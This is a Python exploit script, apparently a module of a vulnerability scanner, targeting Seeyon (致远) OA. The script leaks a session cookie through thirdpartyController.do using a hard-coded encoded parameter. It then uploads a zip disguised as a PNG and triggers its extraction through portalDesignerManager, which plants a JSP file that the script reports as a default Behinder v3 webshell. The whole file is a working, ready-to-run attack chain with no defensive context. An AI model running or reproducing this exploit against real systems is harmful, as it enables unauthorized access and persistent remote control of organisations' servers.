import requests
from requests.packages.urllib3.exceptions import InsecureRequestWarning
from lib.Urldeal import umethod
from lib import *
import logging
import re

def fileUpload(target_url, cookie):
    vuln_url = target_url + 'seeyon/fileUpload.do?method=processUpload'
    files = [('file1', ('test.png', open('./TEST233.zip', 'rb'), 'image/png'))]
    header = {'Cookie': 'JSESSIONID=%s' % cookie}
    data = {'callMethod': 'resizeLayout', 'firstSave': "true", 'takeOver': "false", "type": '0', 'isEncrypt': "0"}
    try:
        r = requests.post(vuln_url, headers=header, data=data, files=files, timeout=3, verify=False)
        firename = re.findall('fileurls=fileurls\+","\+\'(.+)\'', r.text, re.I)
        if len(firename) == 0:
            print(Vcolors.WARNING +"[WARNING] zip文件上传失败" +Vcolors.ENDC)
        else:
            print(Vcolors.RED + "[INFO] zip文件上传成功" + Vcolors.ENDC)
            unzip(header, target_url, firename)
    except:
        print(Vcolors.WARNING + "[WARNING] zip文件上传失败" + Vcolors.ENDC)


def unzip(header, target_url, firename):
    vuln_url = target_url + 'seeyon/ajax.do'
    data = 'method=ajaxAction&managerName=portalDesignerManager&managerMethod=uploadPageLayoutAttachment&arguments=%5B0%2C%22' + nowtime + '%22%2C%22' + \
           firename[0] + '%22%5D'
    header['Content-Type'] = 'application/x-www-form-urlencoded'
    try:
        r = requests.post(vuln_url, headers=header, data=data, timeout=3, verify=False)
        if r.status_code == 500:
            shell_url = target_url + 'seeyon/common/designer/pageLayout/test233.jsp'
            if requests.get(shell_url, timeout=3, verify=False).status_code == 200:
                print(Vcolors.RED +"[SUCCESS] zip文件解压成功, 冰蝎三默认WebShell: {}".format(shell_url) +Vcolors.ENDC)
            else:
                print(Vcolors.WARNING + "[x] 致远OA Session泄露 任意文件上传漏洞利用失败"+ Vcolors.ENDC)
        else:
            print(Vcolors.WARNING + "[x] zip文件解压失败" + Vcolors.ENDC)
    except:
        print(Vcolors.WARNING + "[x] zip文件解压失败" + Vcolors.ENDC)


def 致远OA_Session泄露_任意文件上传(Url):
    scheme, url, port = umethod(Url)
    urldata = scheme + "://" + url + ':' + str(port) + '/'
    vuln_url = urldata + 'seeyon/thirdpartyController.do'

    header = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36",
        "Content-Type": "application/x-www-form-urlencoded",
    }
    data = "method=access&enc=TT5uZnR0YmhmL21qb2wvZXBkL2dwbWVmcy9wcWZvJ04+LjgzODQxNDMxMjQzNDU4NTkyNzknVT4zNjk0NzI5NDo3MjU4&clientPath=127.0.0.1"
    try:
        r = requests.post(vuln_url, headers=header, data=data, timeout=3, verify=False)
        if r.status_code == 200 and "a8genius.do" in r.text and 'set-cookie' in str(r.headers).lower():
            cookies = requests.utils.dict_from_cookiejar(r.cookies)
            cookie = cookies['JSESSIONID']
            print(Vcolors.RED + "[INFO] 成功获取到Session: {}".format(cookie)+Vcolors.ENDC)
            fileUpload(urldata, cookie)
        else:
            print(Vcolors.WARNING + "[x] 获取Session失败" + Vcolors.ENDC)
    except:
        logging.error("致远OA_Session泄露_任意文件上传脚本出现异常")



